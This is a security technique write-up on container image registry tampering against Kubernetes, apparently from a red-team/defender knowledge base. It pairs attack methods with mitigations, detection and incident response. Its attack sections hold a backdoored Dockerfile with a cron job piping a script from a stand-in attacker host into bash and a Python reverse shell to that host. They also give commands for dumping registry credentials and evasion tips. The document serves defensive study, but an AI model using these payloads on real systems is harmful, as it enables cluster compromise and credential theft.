# [K8S-SUPPLY-002]: Container Image Registry Tampering

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | K8S-SUPPLY-002 |
| **MITRE ATT&CK v18.1** | [T1195.001](https://attack.mitre.org/techniques/T1195/001/) - Supply Chain Compromise: Compromise Software Repository |
| **Tactic** | Initial Access / Supply Chain Compromise |
| **Platforms** | Kubernetes |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Kubernetes 1.14+ (all versions), Docker/Container runtime all versions |
| **Patched In** | N/A - Requires defensive controls, not a patched vulnerability |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Container Image Registry Tampering is a supply chain attack where an attacker gains unauthorized access to a container image registry (Docker Hub, ECR, GCR, ACR, Nexus, Harbor) and replaces legitimate images with malicious ones. When Kubernetes operators deploy applications using image tags (e.g., `nginx:latest`), they unwittingly pull and run compromised container images. Attackers exploit weak registry credentials, unpatched registry vulnerabilities, or social engineering to establish persistence, deploy backdoors, exfiltrate data, or perform cryptojacking. The attack is stealthy because the malicious image appears legitimate to operators unfamiliar with the image's integrity.

**Attack Surface:** Container image registries including public registries (Docker Hub, Quay), cloud-native registries (AWS ECR, Azure ACR, Google GCR), and self-hosted registries (Harbor, Nexus, ChartMuseum). The attack leverages image tags (mutable references) instead of immutable SHA256 digests to enable replacement attacks.

**Business Impact:** **Complete cluster compromise, cryptojacking, data exfiltration, backdoor installation, lateral movement to host infrastructure.** Organizations running tampered images face immediate container compromise, ability for attackers to access Kubernetes secrets, persistent access through backdoored containers, and supply chain pollution affecting all downstream users of the compromised image.

**Technical Context:** Image replacement can occur silently during pod startup. Operators are unaware because image references remain identical; only the underlying image content changes. Detection requires image scanning, signature verification, or digest-based deployments rather than tag-based ones.

### Operational Risk

- **Execution Risk:** **Medium** - Requires registry credential compromise or vulnerability exploitation, but execution is instant upon pod creation
- **Stealth:** **High** - Malicious image appears identical to legitimate image; backdoor executes silently during container initialization
- **Reversibility:** **No** - Pods running malicious images must be forcibly deleted; compromise is immediate upon creation

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Kubernetes** | 5.1.1 / 5.1.2 | Enforce image pull policies; use only approved registries |
| **CIS Docker** | 4.1 / 4.2 | Image security and registry access controls |
| **NIST 800-53** | SA-4 / SI-7 | Software integrity and supply chain security |
| **GDPR** | Art. 32 | Security measures and integrity verification |
| **NIS2** | Art. 21 | Cyber risk management and supply chain protection |
| **ISO 27001** | A.14.1 | Supplier relationships and information security |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Registry credential access (push permissions) or ability to exploit unpatched registry vulnerability
- **Required Access:** Network access to registry API (typically HTTPS on port 443)

**Supported Versions:**
- **Kubernetes:** 1.14+ (all supported versions)
- **Container Registries:** Docker Hub, Quay, Harbor, Nexus, AWS ECR, Azure ACR, Google GCR (all versions)
- **Image Formats:** Docker/OCI Image Manifest V2

**Tools:**
- [Docker CLI](https://docs.docker.com/engine/reference/commandline/cli/) (for image push/pull)
- [Cosign](https://docs.sigstore.dev/cosign/overview/) (image signing/verification)
- [Kaniko](https://github.com/GoogleContainerTools/kaniko) (container image builder)
- [Trivy](https://aquasecurity.github.io/trivy/) (image scanning)
- [Registry API clients](https://docs.docker.com/registry/spec/api/) (e.g., curl, Python docker library)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Registry Credential Discovery

```bash
# Find Docker credentials in Kubernetes secrets
kubectl get secrets -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\t"}{.type}{"\n"}{end}' | grep docker

# Extract registry credentials from pod spec
kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.imagePullSecrets[*].name}{"\n"}{end}'

# Check for hardcoded credentials in environment variables
kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].env[*]}{"\n"}{end}'
```

**What to Look For:**
- `docker-registry` type secrets containing base64-encoded credentials
- Environment variables containing registry usernames/passwords
- Credentials for public registries (especially Docker Hub) that may be weak

### Registry Authentication Verification

```bash
# Verify registry accessibility and authentication
docker login -u <username> -p <password> <registry-url>

# Test registry API access
curl -u <username>:<password> https://<registry>/v2/_catalog

# Enumerate images in registry
curl -u <username>:<password> https://<registry>/v2/<repo>/tags/list

# Check current image digest
docker pull <image>:<tag>
docker inspect <image>:<tag> | grep -i sha256
```

**What to Look For:**
- Successful authentication indicates valid credentials
- Multiple image versions/tags indicate active usage
- Missing image digests in pod specs suggest mutable tag usage (vulnerable)

### Image Pull Policy Assessment

```bash
# Enumerate image pull policies across all pods
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.spec.containers[*].imagePullPolicy}{"\n"}{end}'

# Identify pods using tag-based images instead of digests
kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}' | grep -v "sha256:"
```

**What to Look For:**
- `imagePullPolicy: Always` means image is re-pulled on every restart (vulnerable to replacement)
- `imagePullPolicy: IfNotPresent` means cached image is used (less vulnerable but still risky)
- Image references using tags (e.g., `nginx:latest`) are mutable and exploitable

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Registry Credential Compromise

**Supported Versions:** Kubernetes 1.14+, all container registries

#### Step 1: Obtain Registry Credentials

**Objective:** Compromise credentials for target container registry through phishing, credential stuffing, or social engineering

**Command (Credential Acquisition):**

```bash
# Attacker obtains credentials through various means:
# 1. Phishing: "Please verify your Docker Hub credentials"
# 2. GitHub credential scanning: Find .docker/config.json in public repositories
# 3. Container image inspection: Extract hardcoded credentials from image layers
# 4. Environment variable exposure: Kubernetes secret dump

# Example: Extract from Kubernetes secret
kubectl get secret <registry-secret> -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d
```

**Expected Output:**

```json
{
  "auths": {
    "docker.io": {
      "username": "victim-org",
      "password": "abc123...xyz",
      "auth": "dmljdGltLW9yZzphYmMxMjM..."
    }
  }
}
```

**What This Means:**
- Attacker now has valid registry credentials
- Can authenticate as victim organization and push malicious images

**OpSec & Evasion:**
- Keep credentials in memory only (avoid writing to disk)
- Use credential harvesting tools to blend with legitimate scanning activity
- Detection likelihood: **Medium** - Registry audit logs may show unusual login locations

#### Step 2: Build Malicious Container Image

**Objective:** Create compromised image containing backdoor/payload

**Command (Backdoored Image Creation):**

```dockerfile
# Dockerfile with hidden backdoor
FROM nginx:latest

# Legitimate nginx setup
COPY nginx.conf /etc/nginx/nginx.conf

# Hidden backdoor: Install reverse shell tools
RUN apt-get update && \
    apt-get install -y netcat-openbsd curl && \
    echo "*/5 * * * * curl http://attacker.example.com/beacon | bash" | crontab - && \
    rm -rf /var/lib/apt/lists/*

# Alternative: Python reverse shell
RUN python3 -m pip install pwntools && \
    echo "import socket; s=socket.socket(); s.connect(('attacker.example.com',4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import subprocess; subprocess.call(['/bin/bash','-i'])" > /tmp/shell.py

ENTRYPOINT ["/docker-entrypoint.sh"]
CMD ["nginx", "-g", "daemon off;"]
```

**Build Command:**

```bash
docker build -t attacker-registry.example.com/nginx:latest .
docker push attacker-registry.example.com/nginx:latest

# Or push to legitimate registry with compromised credentials
docker build -t docker.io/victim-org/nginx:latest .
docker push docker.io/victim-org/nginx:latest
```

**Expected Output:**

```
Sending build context to Docker daemon
Successfully built abc123def456
latest: digest: sha256:abc123def456...xyz pushed
```

**What This Means:**
- Malicious image is now published in registry
- Any pod referencing this image tag will pull the backdoored version
- Backdoor executes automatically during container initialization

**OpSec & Evasion:**
- Image appears identical to original when inspected from Kubernetes perspective
- Backdoor code is obfuscated or disguised as legitimate library code
- Use legitimate base image to avoid suspicion
- Detection likelihood: **High** if image scanning enabled; **Low** if relying on manual inspection

#### Step 3: Deploy Malicious Image via Tag Replacement

**Objective:** Cause Kubernetes operator to pull and deploy malicious image by replacing legitimate image in registry

**Command (Tag Replacement - Mutable Tag Attack):**

```bash
# Using compromised credentials, attacker replaces image tag
docker pull docker.io/victim-org/nginx:latest
docker tag docker.io/victim-org/nginx:latest attacker-image:latest
docker push attacker-image:latest docker.io/victim-org/nginx:latest

# Alternative: Direct tag manipulation via registry API
curl -X PUT -H "Authorization: Bearer <token>" \
  https://docker.io/v2/victim-org/nginx/manifests/latest \
  -d @malicious-manifest.json
```

**Expected Output:**

```
latest: digest: sha256:malicious123456...xyz
```

**What This Means:**
- Image tag `docker.io/victim-org/nginx:latest` now points to malicious image
- Next pod creation using this tag will pull malicious version
- Image cache on nodes will be updated on next pull

**OpSec & Evasion:**
- Timing attack to avoid immediate detection
- Replace during off-hours or maintenance windows
- Monitor organization's deployment schedules to time replacement
- Detection likelihood: **Medium** if registry audit logs reviewed; **Low** if manual

### METHOD 2: Typosquatting Registry/Image Names

**Supported Versions:** Kubernetes 1.14+, all container registries

#### Step 1: Register Lookalike Registry or Image

**Objective:** Create registry/image with name similar to legitimate source

**Command (Typosquatted Image Creation):**

```bash
# Option 1: Register on public registry with typosquatted name
docker build -t docker.io/attacker-org/nignx:latest .  # nignx vs nginx
docker push docker.io/attacker-org/nignx:latest

# Option 2: Use subdomain typosquatting
docker build -t images.docker.io/nginx:latest .
docker push images.docker.io/nginx:latest

# Option 3: Capital letter confusion
docker build -t docker.io/NginX:latest .
docker push docker.io/NginX:latest
```

**Expected Output:**

```
Pushed successfully to docker.io/attacker-org/nignx:latest
```

**What This Means:**
- Attacker image is now publicly available
- Operators may accidentally reference wrong image due to typo

#### Step 2: Distribute via Documentation/Forums

**Command (Social Engineering):**

```bash
# Publish fake documentation suggesting:
# "For best performance, use: docker pull docker.io/attacker-org/nignx:latest"
# Or create GitHub repositories recommending malicious image
```

**What This Means:**
- Operators copy image reference from malicious documentation
- Unknowingly pull and deploy attacker's image

### METHOD 3: Exploit Unpatched Registry Vulnerability

**Supported Versions:** Registry-specific (Harbor, Nexus, etc.)

#### Step 1: Identify Vulnerable Registry Instance

**Objective:** Find unpatched registry vulnerability

**Command (Registry Enumeration):**

```bash
# Scan for exposed registries
nmap -p 443,5000 <target-range>

# Identify registry version
curl https://<registry>:5000/v2/ -H "Authorization: Bearer <token>"
curl https://<registry>/api/v2.0/systeminfo  # Harbor

# Check for known vulnerabilities
searchsploit harbor  # Example: CVE-2021-22207
```

**Expected Output:**

```
HTTP 401 Unauthorized (indicates registry present)
{"version":"v2.3.1"}
```

#### Step 2: Exploit Vulnerability to Push Malicious Image

**Command (Example: Harbor RBAC Bypass):**

```bash
# Exploit vulnerability to bypass authentication
curl -X PUT https://<harbor-registry>/api/v2.0/projects \
  -H "Content-Type: application/json" \
  -d '{"project_name":"malicious","public":true}'

# Push malicious image to newly created project
docker push <harbor-registry>/malicious/nginx:latest
```

**What This Means:**
- Attacker bypasses registry authentication
- Malicious image is now in registry available for deployment

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Enforce Image Signature Verification:** Deploy image signature verification to prevent unsigned/untrusted images.

    **Manual Steps (Using Cosign + Kyverno):**
    1. Install Cosign CLI:
       ```bash
       curl -Lo cosign https://github.com/sigstore/cosign/releases/latest/download/cosign-linux-amd64
       chmod +x cosign
       ```
    2. Generate signing key:
       ```bash
       cosign generate-key-pair
       ```
    3. Install Kyverno for enforcement:
       ```bash
       helm repo add kyverno https://kyverno.github.io/kyverno/
       helm install kyverno kyverno/kyverno --namespace kyverno --create-namespace
       ```
    4. Create cluster policy enforcing signatures:
       ```yaml
       apiVersion: kyverno.io/v1
       kind: ClusterPolicy
       metadata:
         name: require-image-signatures
       spec:
         validationFailureAction: enforce
         rules:
         - name: verify-image-signature
           match:
             resources:
               kinds:
               - Pod
           verifyImages:
           - imageReferences:
             - "docker.io/*"
             attestors:
             - name: check-cosign
               entries:
               - keys:
                   publicKeys: |
                     -----BEGIN PUBLIC KEY-----
                     <cosign-public-key>
                     -----END PUBLIC KEY-----
       ```

*   **Use Image Digests Instead of Tags:** Force deployments to use immutable SHA256 digests rather than mutable tags.

    **Manual Steps:**
    1. Identify current image tags:
       ```bash
       kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}'
       ```
    2. Get image digest for each tag:
       ```bash
       docker inspect docker.io/nginx:latest | grep -i sha256
       # Result: sha256:abc123def456...xyz
       ```
    3. Update deployment to use digest:
       ```yaml
       apiVersion: apps/v1
       kind: Deployment
       metadata:
         name: nginx
       spec:
         template:
           spec:
             containers:
             - name: nginx
               image: docker.io/nginx@sha256:abc123def456...xyz  # Use digest, not tag
       ```
    4. Enforce via policy:
       ```yaml
       apiVersion: kyverno.io/v1
       kind: ClusterPolicy
       metadata:
         name: require-image-digest
       spec:
         validationFailureAction: enforce
         rules:
         - name: validate-digest
           match:
             resources:
               kinds:
               - Pod
           validate:
             message: "Images must be referenced by digest"
             pattern:
               spec:
                 containers:
                 - image: "*@sha256:*"
       ```

*   **Implement Registry Access Controls:** Restrict registry access to approved users and networks.

    **Manual Steps (Harbor Example):**
    1. Login to Harbor GUI → Admin Center → Projects
    2. Create project with restricted access:
       - Project name: `trusted-images`
       - Public: OFF
       - Access level: Private
    3. Configure RBAC:
       - Harbor → Admin Center → Roles
       - Create role: `image-pusher` with push permissions
       - Assign only to verified users
    4. Enable registry authentication in Kubernetes:
       ```bash
       kubectl create secret docker-registry regcred \
         --docker-server=<harbor-registry> \
         --docker-username=<username> \
         --docker-password=<password>
       ```
    5. Reference in pod spec:
       ```yaml
       spec:
         imagePullSecrets:
         - name: regcred
       ```

### Priority 2: HIGH

*   **Scan Images for Vulnerabilities:** Implement automated image scanning in CI/CD pipeline.

    **Manual Steps (Using Trivy):**
    1. Install Trivy:
       ```bash
       curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin
       ```
    2. Scan image before deployment:
       ```bash
       trivy image --severity HIGH,CRITICAL docker.io/nginx:latest
       ```
    3. Integrate into CI/CD pipeline (GitHub Actions example):
       ```yaml
       - name: Scan image with Trivy
         run: trivy image --exit-code 1 --severity HIGH docker.io/nginx:latest
       ```

*   **Enable Registry Audit Logging:** Monitor and log all registry activities.

    **Manual Steps:**
    1. Enable audit logging in registry configuration:
       ```yaml
       # Harbor config
       log:
         level: info
         outputs:
         - stdout
         - type: syslog
           host: logserver.example.com
           port: 514
       ```
    2. Monitor for suspicious activities:
       ```bash
       # Monitor for failed pushes or unauthorized access
       grep -i "unauthorized\|push\|delete" /var/log/registry.log
       ```

### Access Control & Policy Hardening

*   **Implement ImagePolicyWebhook:** Control which images can be deployed via admission controller.

    **Manual Steps:**
    1. Create image policy configuration:
       ```json
       {
         "imagePolicy": {
           "kubeConfigFile": "/etc/kubernetes/image-policy-webhook.yaml",
           "allowTTL": 50,
           "denyTTL": 50,
           "retryBackoff": 500,
           "defaultAllow": false
         }
       }
       ```
    2. Configure kube-apiserver to use webhook:
       ```bash
       # In /etc/kubernetes/manifests/kube-apiserver.yaml
       - --admission-control-config-file=/etc/kubernetes/admission-config.yaml
       ```

*   **Network Policies:** Restrict container egress to prevent data exfiltration.

    **Manual Steps:**
    1. Create NetworkPolicy restricting egress:
       ```yaml
       apiVersion: networking.k8s.io/v1
       kind: NetworkPolicy
       metadata:
         name: deny-external-egress
       spec:
         podSelector: {}
         policyTypes:
         - Egress
         egress:
         - to:
           - podSelector: {}
           ports:
           - protocol: TCP
             port: 443
       ```

#### Validation Command (Verify Fix)

```bash
# Verify image signature enforcement
kubectl get clusterpolicy | grep signature

# Verify all images use digests
kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' | grep -v "@sha256:"

# Verify registry audit logging enabled
curl -H "Authorization: Bearer <token>" https://<registry>/api/v2.0/auditlogs | head

# Verify network policies active
kubectl get networkpolicies -A
```

**Expected Output (If Secure):**

```
NAME                              VALIDATIONACTION
require-image-signatures          enforce

# No output = all images use digests

# Registry audit logs showing all push/pull activities
```

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Registry Indicators:**
    - Image pushed from unusual location (different IP, country, timezone)
    - Image push by user who typically only pulls images
    - Unusual image size changes (backdoored image larger than original)
    - Image manifest modification without corresponding source code change
    - Registry credentials accessed from unauthorized location

*   **Image Indicators:**
    - Image layers containing unusual tools (netcat, curl, ssh, crypto miners)
    - Image containing hidden files or scripts
    - Unusual base image (not official/verified sources)
    - Image vulnerabilities not present in previous version

*   **Kubernetes Indicators:**
    - Pod created with image tag that conflicts with organizational standards
    - Image pulled from untrusted registry
    - Container running with unexpected privileges (runAsRoot)
    - Unusual network connections from container (outbound to C2)

*   **Network Indicators:**
    - Outbound connections to cryptocurrency mining pools
    - DNS queries to attacker C2 infrastructure
    - Data exfiltration from container to external IP
    - Unusual egress traffic volume from pod

### Forensic Artifacts

*   **Container Image Layers:** Inspect image construction
    ```bash
    docker history <image>:<tag>
    docker inspect <image>:<tag>
    ```

*   **Registry Audit Logs:** Check push/pull history
    ```bash
    # Harbor API
    curl -H "Authorization: Bearer <token>" https://<harbor>/api/v2.0/auditlogs
    
    # Docker Hub - check push timestamps
    curl https://hub.docker.com/v2/repositories/<org>/<repo>/tags/
    ```

*   **Kubernetes Audit Logs:** Check image pull events
    ```bash
    kubectl logs -n kube-system kube-apiserver-<node> | grep -i "image\|pull"
    ```

*   **Container Introspection:** Inspect running container
    ```bash
    kubectl exec -it <pod> -n <namespace> -- /bin/sh
    ps aux  # Check running processes
    env    # Check environment variables
    netstat -an  # Check network connections
    ```

### Response Procedures

1.  **Isolate:**
    **Command:**
    ```bash
    # Immediately delete affected pod
    kubectl delete pod <pod-name> -n <namespace> --grace-period=0 --force
    
    # Quarantine affected namespace
    kubectl label namespace <namespace> quarantine=true
    
    # Block image from registry
    curl -X DELETE -H "Authorization: Bearer <token>" \
      https://<registry>/v2/<repo>/manifests/<digest>
    ```

2.  **Collect Evidence:**
    **Command:**
    ```bash
    # Export container logs
    kubectl logs <pod-name> -n <namespace> --all-containers=true > pod-logs.txt
    
    # Snapshot running processes before deletion
    kubectl exec <pod-name> -n <namespace> -- ps aux > processes.txt
    
    # Export image layers for analysis
    docker save <image>:<tag> > image-snapshot.tar
    
    # Capture network connections
    kubectl exec <pod-name> -n <namespace> -- netstat -an > netstat.txt
    ```

3.  **Remediate:**
    **Command:**
    ```bash
    # Update all deployments to use clean image digest
    kubectl set image deployment/<name> \
      <container>=<image>@sha256:<clean-digest> -n <namespace>
    
    # Rotate registry credentials
    kubectl delete secret regcred -n <namespace>
    kubectl create secret docker-registry regcred \
      --docker-username=<new-user> --docker-password=<new-password>
    
    # Reset image pull policy
    kubectl patch deployment <name> -n <namespace> -p \
      '{"spec":{"template":{"spec":{"containers":[{"name":"<container>","imagePullPolicy":"Always"}]}}}}'
    ```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Persistence** | [K8S-SUPPLY-001] | Helm Chart Repository Poisoning |
| **2** | **Initial Access** | **[K8S-SUPPLY-002]** | **Container Image Registry Tampering** |
| **3** | **Execution** | Container Backdoor Deployment | Malicious container starts automatically |
| **4** | **Privilege Escalation** | Container Escape | Break out to host using kernel vulnerabilities |
| **5** | **Impact** | Cryptojacking / Data Exfiltration | Mine cryptocurrency or steal data |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Cryptojacking via Compromised Kubernetes Images (2023-2024)

- **Target:** Multiple organizations running public Kubernetes clusters
- **Timeline:** Ongoing campaigns throughout 2023-2024
- **Technique Status:** ACTIVE - Attackers compromise Docker API endpoints and push cryptocurrency miners
- **Impact:** XMRig cryptocurrency miners deployed cluster-wide, lateral movement between nodes, resource exhaustion
- **References:** [Datadog Security Research - Kubernetes Cryptojacking](https://www.datadoghq.com/blog/container-image-signing/), [Wiz Container Security Research](https://www.wiz.io/academy/container-security/container-images)

### Example 2: Misconfigured Default Container Images (2024)

- **Target:** Organizations deploying Apache Pinot, Meshery, Selenium Grid via default Helm charts
- **Timeline:** Discovered 2024, ongoing exploitation
- **Technique Status:** ACTIVE - Default insecure configurations expose services to internet without authentication
- **Impact:** Data theft, cluster access, arbitrary code execution via exposed web interfaces
- **Reference:** [Microsoft Defender for Cloud - Misconfigured Helm Charts](https://techcommunity.microsoft.com/blog/microsoftdefendercloudblog/)

### Example 3: Container Escape via CVE-2022-0185 (2022)

- **Target:** Kubernetes clusters with vulnerable Linux kernel versions
- **Timeline:** Disclosed January 2022, actively exploited throughout 2022-2023
- **Technique Status:** ACTIVE (in vulnerable kernel versions) - Heap buffer overflow in Linux kernel allows privilege escalation
- **Impact:** Container escape to node, cluster compromise, host OS compromise
- **Reference:** [CrowdStrike - Kubernetes Container Escape Analysis](https://www.crowdstrike.com/en-us/blog/cve-2022-0185-kubernetes-container-escape-using-linux-kernel-exploit/)

---